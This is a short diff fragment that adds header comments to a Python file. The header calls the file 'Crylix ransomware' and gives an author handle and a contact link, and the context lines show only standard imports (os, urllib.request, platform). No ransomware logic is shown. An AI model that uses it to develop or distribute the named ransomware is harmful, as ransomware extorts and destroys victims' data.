@@ -1,3 +1,10 @@
+# Crylix ransomware
+# Author: AirFlow
+# Contact: https://airflowd.netlify.app/
+
+
+
+
 import os
 import urllib.request
 import platform
